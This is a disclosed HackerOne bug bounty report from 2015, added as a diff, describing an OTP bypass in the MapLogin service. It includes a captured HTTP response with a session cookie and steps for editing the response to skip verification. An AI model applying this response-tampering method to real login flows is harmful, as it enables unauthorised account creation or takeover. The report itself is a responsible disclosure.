@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/77330
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/arun_agr
+ReportedTo:MapLogin(maplogin)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:25.07.2015 1:11:49
+
+Summary:
+This bug allowed the creation of account for an unclaimed e-mail address. 
+hi Team i was able to make an authentication bypass in your application .
+
+Steps to replicate:
+
+there are two phase evolved 
+1) creating account using valid otp sent to registered email id .
+2) capture the response it will be like 
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-cache
+Vary: Accept-Encoding
+Date: Tue, 21 Jul 2015 13:52:27 GMT
+Server: Google Frontend
+Set-Cookie: session="eyJTVEFSVCI6Ik9LIiwiQ09ERSI6dHJ1ZSwiRU1BSUwiOiJhYWFydW5hZ2Fyd2FsQGdtYWlsLmNvbSIsIk1PREUiOiJTRVQifQ\075\075|1437486747|1a8ca2ba59d77ea84586c163405f547b686d6a2f"; Path=/; secure; HttpOnly
+Alternate-Protocol: 443:quic,p=1
+Expires: Tue, 21 Jul 2015 13:52:27 GMT
+Content-Length: 39
+
+{"status": "OK", "url": "/secretpage/"}
+
+
+Now attacker chance phase two:
+
+1) Create an account with valid information 
+2) Now some OTP will be sent to your registered email address 
+3) now provide any random 4 digit number 
+4)now edit the response for the specific request to 
+{"status": "OK", "url": "/secretpage/"}
+and add set cookie header value to any random number  of same length
+5) OTP will be bypassed PFA Screen shot.
+
+Let me know if you need more details.
+
+Thanks
+Arun
